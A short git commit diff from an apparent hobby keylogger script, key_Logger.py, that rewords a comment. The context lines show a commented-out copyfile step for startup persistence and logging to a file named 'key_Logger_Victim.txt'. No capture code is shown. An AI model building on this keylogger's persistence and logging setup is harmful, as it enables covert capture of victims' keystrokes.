9cf50449ade56f824f3627186a22b9cb3eb9d176
DeepakDK04 <deepak99pmk@gmail.com>
2020-12-25 16:36:54 +0530

    final commit, rearraged comments

--- key_Logger.py
+++ key_Logger.py
@@ -9,7 +9,7 @@ logging_directory = f'C:\\Users\\{USERNAME}\\Desktop'
 # copyfile("key_Logger.py", Destination) # this will lead to add program startup menu,To run programe Indefinently, Avoid this unless you know fully :)
 
 # Un-comment these comments, and excecute with the programe will cause your pc run this code indefently in background. 
-#In case you did these[You Idiot.. ] :) ,First interept the current kernal to stop the process and  go to task manager and kill the process named key_Logger mannually.
+#In case you did ,First interept the current kernal to stop the process and  go to task manager and kill the process named key_Logger mannually.
 
 logging.basicConfig(filename=f"{logging_directory}\\key_Logger_Victim.txt",
                     level=logging.DEBUG, format="%(asctime)s    :    %(message)s")
